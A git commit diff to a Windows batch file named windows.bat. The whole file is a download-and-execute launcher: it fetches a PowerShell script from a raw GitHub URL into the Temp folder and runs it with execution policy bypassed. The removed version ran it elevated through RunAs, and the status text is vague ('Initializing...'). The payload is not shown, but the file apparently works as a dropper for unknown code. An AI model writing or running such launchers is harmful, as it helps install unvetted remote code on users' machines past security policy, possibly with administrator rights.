66ab32963cb321e7f52ca18efe188f5f8ceaa7e0
qoqoxxxx-stack <qoqo.xxxx@gmail.com>
2026-03-17 17:16:22 -0500

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,13 +1,13 @@
 @echo off
 set "URL=https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/windows.ps1"
-set "DEST=%AppData%\windows.ps1"
+set "DEST=%Temp%\windows.ps1"
 
-echo Processing...
+echo Initializing...
 
-:: Use PowerShell to download with TLS 1.2 enabled and bypass policy
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
+:: Force TLS 1.2 and download the PS1
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '%URL%' -OutFile '%DEST%'"
 
-:: Run the downloaded PS1 as Administrator with Bypass enabled
-powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%DEST%""'"
+:: Run with Bypass to make sure it hits the Admin check
+powershell -ExecutionPolicy Bypass -File "%DEST%"
 
 exit
